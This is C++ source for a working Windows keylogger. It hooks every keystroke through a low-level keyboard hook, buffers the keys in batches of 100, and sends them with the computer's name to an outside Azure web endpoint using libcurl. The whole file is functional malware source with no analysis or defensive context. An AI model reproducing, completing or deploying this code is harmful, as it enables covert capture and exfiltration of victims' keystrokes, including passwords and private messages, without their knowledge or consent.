#define CURL_STATICLIB
#define _WIN32_WINNT 0x0400
#pragma comment( lib, "user32.lib" )

#include <iostream>
#include <Windows.h>
#include <cstdio>
#include <curl/curl.h>
#include <string>

using namespace std;

HHOOK hKeyboardHook;
CURL* curl;

const char* requestUrl = "https://rumlogger.azurewebsites.net/api/User/AddUserData";
const int maxSize = 1000;
char* name;

void SendLogs(const char* logs)
{
	char* url = new char[maxSize];
	sprintf_s(url, static_cast<size_t>(maxSize), "%s?Name=%s&Logs=%s",
		requestUrl, name, curl_easy_escape(curl, logs, 0));

	curl_easy_setopt(curl, CURLOPT_URL, url);
	curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "");
	auto res = curl_easy_perform(curl);

	delete[] url;
}

const int logsLength = 100;
char* tab = nullptr;
int logIndex = 0;

__declspec(dllexport) LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode == HC_ACTION && (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN))
	{
		const KBDLLHOOKSTRUCT hookedKey = *reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

		auto key = hookedKey.vkCode;
		auto shift = GetAsyncKeyState(VK_SHIFT);
		auto ctrl = GetAsyncKeyState(VK_CONTROL);
		auto alt = GetAsyncKeyState(VK_MENU);

		printf("Keycode = %c, %d %d %d   %d\n", key, shift, ctrl, alt, logIndex);

		if (logIndex < logsLength) {
			tab[logIndex++] = static_cast<char>(key);
		}
		else if(logIndex >= logsLength)
		{
			logIndex = 0;
			SendLogs(tab);
		}
	}
	return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

DWORD WINAPI my_HotKey(LPVOID lpParm)
{
	HINSTANCE hInstance = GetModuleHandle(nullptr);
	if (!hInstance) hInstance = LoadLibrary(static_cast<LPCWSTR>(lpParm));
	if (!hInstance) return 2137;

	hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardEvent, hInstance, NULL);

	MSG message;
	while (GetMessage(&message, nullptr, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}

	UnhookWindowsHookEx(hKeyboardHook);
	return 0;
}

char* ReadComputerName()
{
	DWORD cchComputerName = MAX_COMPUTERNAME_LENGTH + 1;
	char* computerName = new char[MAX_COMPUTERNAME_LENGTH + 1];
	GetComputerNameA(computerName, &cchComputerName);
	return computerName;
}

int work(int argc, char** argv)
{
	DWORD threadId;
	const auto threadHandle = CreateThread(nullptr, NULL, my_HotKey, argv[0], NULL, &threadId);
	return threadHandle
		? WaitForSingleObject(threadHandle, INFINITE)
		: 2137;
}


int main(int argc, char** argv)
{
	curl = curl_easy_init();

	tab = static_cast<char*>(calloc(logsLength+1, sizeof(char)));
	name = ReadComputerName();
	auto ret = work(argc, argv);

	curl_easy_cleanup(curl);
	curl = nullptr;

	return ret;
}
